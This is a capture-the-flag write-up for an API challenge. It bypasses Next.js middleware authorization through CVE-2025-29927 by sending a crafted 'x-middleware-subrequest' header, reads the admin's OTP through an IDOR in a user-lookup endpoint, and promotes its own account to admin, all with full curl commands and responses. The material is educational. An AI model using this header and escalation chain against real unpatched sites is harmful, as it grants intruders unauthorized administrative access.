
# NextGen

 * Category: API
 * Solved by the JCTF Team

## Description

> Hey everyone! 👋
> 
> I've been working hard on our brand new Next Gen Portal - a sleek, modern enterprise dashboard that's going to revolutionize how our teams collaborate and manage their workflows. The design is clean, the interface is intuitive, and I think you're all going to love it!
> 
> Quick heads up: There's an "Admin Panel" button in there, but don't bother clicking it unless you're actually an admin - the system has proper security controls in place, so regular users won't be able to access it anyway.

A website was attached.

## Solution

During the competition, we solved this with an unintended solution, you can see the details below.

### Intended Solution

We are prompted to register to a website:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/next_gen]
└─$ curl -X POST "https://nextgen.appsecil.ctf.today/api/register" -H "Content-Type: application/json" --cookie cookie.txt --cookie-jar cookie.txt --data-raw '{"username": "user1", "password": "Password1"}'
{"success":true,"message":"Account created successfully","user":{"id":29,"username":"user1","guid":"830f431a-bcb5-4607-a6c5-51f0e4f0fc1e","role":"user"}}
```

We get a GUID. When we visit the website, a call is made to '/api/guid/me' which also returns the GUID together
with some more information:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/next_gen]
└─$ curl -X GET "https://nextgen.appsecil.ctf.today/api/guid/me" -H "Content-Type: application/json" --cookie cookie.txt --cookie-jar cookie.txt
{"user":{"id":29,"username":"user1","guid":"830f431a-bcb5-4607-a6c5-51f0e4f0fc1e","role":"user","otp":"pv#f^$txs0M4"}}
```

There's a big "Admin" button, but when clicking it we receive an "Unauthorized" error. How do we access the Admin panel?

The challenge name hints that this is a Next.js challenge. We can get the Next.js version from
the developer console:

```console
NextJSVersion: window.next?.version
"15.2.2" 
```

This isn't the latest version! And it turns out that this version is vulnerable to 
[CVE-2025-29927](https://jfrog.com/blog/cve-2025-29927-next-js-authorization-bypass/): 
An authorization bypass vulnerability.

In a nutshell, sending a specific HTTP header in the request allows bypassing middleware.
Since middleware is often used for authorization, this easily becomes an authorization 
bypass attack.

According to the link above, we need to send something like `"x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"`.
We can use Burp Suite's *Proxy* feature to intercept all requests to the website, and insert
our custom header (Proxy -> Settings -> HTTP Match and Replace rules -> Add -> 
Type: Request Header, leave Match empty, add header in "Replace", verify with "Test").

Once we enable the proxy and visit `/admin`, we get the following form:

```html
<form class="form-container">
    <div class="form-group">
        <label for="otpToken">Admin OTP Token</label>
        <input id="otpToken" placeholder="Enter 12-character OTP token" required="" type="text" value="" style="font-family: monospace;">
        <small style="color: rgb(102, 102, 102); font-size: 0.8rem;">Enter the admin OTP token required for promotion authorization</small>
    </div>
    <div class="form-group">
        <label for="userGuid">User GUID to Promote</label>
        <input id="userGuid" placeholder="Enter user GUID (e.g., 12345678-1234-1234-1234-123456789abc)" required="" type="text" value="" style="font-family: monospace;">
        <small style="color: rgb(102, 102, 102); font-size: 0.8rem;">Enter the exact GUID of the user you want to promote to admin</small>
    </div>
    <div class="button-group">
        <button type="submit" class="btn btn-primary" style="background: linear-gradient(135deg, rgb(231, 76, 60) 0%, rgb(192, 57, 43) 100%);">⬆️ Promote to Admin</button>
        <button type="button" class="btn btn-secondary">Back to Portal</button>
    </div>
</form>
```

We can use this API to promote a user to admin. Let's do that to ourselves! We already have our own GUID, but where do we 
get the admin's OTP from? Back to the GUID API, it is.

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/next_gen]
└─$ curl -X GET "https://nextgen.appsecil.ctf.today/api/guid/0" -H "Content-Type: application/json" --cookie cookie.txt --cookie-jar cookie.txt
{"error":"User not found"}                                                                                                                                                         
┌──(user@kali3)-[/media/sf_CTFs/appsec/next_gen]
└─$ curl -X GET "https://nextgen.appsecil.ctf.today/api/guid/1" -H "Content-Type: application/json" --cookie cookie.txt --cookie-jar cookie.txt
{"user":{"id":1,"username":"admin","guid":"abe7a399-0e94-429b-af05-cc4d0d082fa8","role":"admin","otp":"X9#mK2@pN7wQ"}} 
```

It looks like the GUID API allows us to read the details for any user, including the admin!

Now we have everything we need to promote ourselves.

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/next_gen]
└─$ curl -X POST "https://nextgen.appsecil.ctf.today/api/promote" -H "Content-Type: application/json" --cookie cookie.txt --cookie-jar cookie.txt -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" --data '{"otpToken": "X9#mK2@pN7wQ", "userGuid": "830f431a-bcb5-4607-a6c5-51f0e4f0fc1e"}'
{"success":true,"message":"User promoted to admin successfully","user":{"username":"user1","guid":"830f431a-bcb5-4607-a6c5-51f0e4f0fc1e","role":"admin"}}
```

We log out and back in again, and we're an admin:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/next_gen]
└─$ curl -X GET "https://nextgen.appsecil.ctf.today/api/guid/me" -H "Content-Type: application/json" --cookie cookie.txt --cookie-jar cookie.txt
{"user":{"id":29,"username":"user1","guid":"830f431a-bcb5-4607-a6c5-51f0e4f0fc1e","role":"admin","otp":"pv#f^$txs0M4"}}
```

Now, we we visit the portal, we get the flag: `AppSec-IL{n3xt_g3n_m1ddl3w4r3_byp455_m45t3r}`.

### Unintended Solution

This the the solution we used during the competition. Just grep for the flag in the sources:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/next_gen]
└─$ curl https://nextgen.appsecil.ctf.today/_next/static/chunks/pages/portal-25c6e3000e97b8ba.js -s | grep -o -P '.{0,50}AppSec.{0,50}'
x-2e35cc4f2b8f6ef8",children:["\uD83D\uDEA9 FLAG: AppSec-IL","{","n3xt_g3n_m1ddl3w4r3_byp455_m45t3r","}"]}
```